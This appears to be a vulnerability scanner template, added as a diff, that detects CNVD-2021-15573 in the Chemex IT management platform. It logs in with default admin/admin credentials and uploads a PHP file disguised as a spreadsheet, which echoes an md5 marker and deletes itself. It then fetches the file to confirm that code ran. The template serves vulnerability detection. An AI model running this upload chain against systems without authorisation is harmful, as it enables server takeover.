@@ -1,0 +1,164 @@
+id: chemex-file-upload-cnvd-2021-15573
+info:
+  name: Chemex Auth File Upload CNVD-2021-15573
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Chemex, an open source IT operation and maintenance management platform, has a file upload vulnerability that can be exploited by attackers to gain control of the server.
+  tags: fileupload, auth
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-15573
+
+variables:
+  xsrf_token_regex: 'XSRF-TOKEN=(.*?);'
+  chemex_session_regex: 'chemex_session=(.*?);'
+  token_regex: '"token":"(.*?)",'
+  file_name_regex: '"name":"(.*?)",'
+
+flow: |
+  http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - id: initial-login
+    method: GET
+    path:
+      - "{{BaseURL}}/auth/login"
+    extractors:
+      - type: regex
+        name: xsrf_token
+        internal: true
+        group: 1
+        regex:
+          - '{{xsrf_token_regex}}'
+      - type: regex
+        name: chemex_session
+        internal: true
+        group: 1
+        regex:
+          - '{{chemex_session_regex}}'
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '{{token_regex}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: login-auth
+    method: POST
+    path:
+      - "{{BaseURL}}/auth/login"
+    headers:
+      Cookie: "XSRF-TOKEN={{xsrf_token}}; chemex_session={{chemex_session}}"
+      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+    body: "_token={{token}}&username=admin&password=admin&_token={{token}}"
+    extractors:
+      - type: regex
+        name: xsrf_token
+        internal: true
+        group: 1
+        regex:
+          - '{{xsrf_token_regex}}'
+      - type: regex
+        name: chemex_session
+        internal: true
+        group: 1
+        regex:
+          - '{{chemex_session_regex}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: fetch-token
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Cookie: "XSRF-TOKEN={{xsrf_token}}; chemex_session={{chemex_session}}"
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '{{token_regex}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/dcat-api/form/upload"
+    headers:
+      Cookie: "XSRF-TOKEN={{xsrf_token}}; chemex_session={{chemex_session}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryBbowlZhO38AfN0NE"
+    body: |
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="_id"
+      xHTgRTrpLMkEIniZ
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="_token"
+      {{token}}
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="upload_column"
+      file
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="primary_key"
+      null
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="_form_"
+      App\Admin\Forms\UserImportForm
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="id"
+      WU_FILE_0
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="name"
+      2.php
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="type"
+      application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="lastModifiedDate"
+      Tue Sep 21 2021 23:02:59 GMT+0800 (中国标准时间)
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="size"
+      10273
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE
+      Content-Disposition: form-data; name="_file_"; filename="2.php"
+      Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+      <?php echo md5(233);unlink(__FILE__);?>
+      ------WebKitFormBoundaryBbowlZhO38AfN0NE--
+    extractors:
+      - type: regex
+        name: file_name
+        internal: true
+        group: 1
+        regex:
+          - '{{file_name_regex}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: file-check
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/files/{{file_name}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
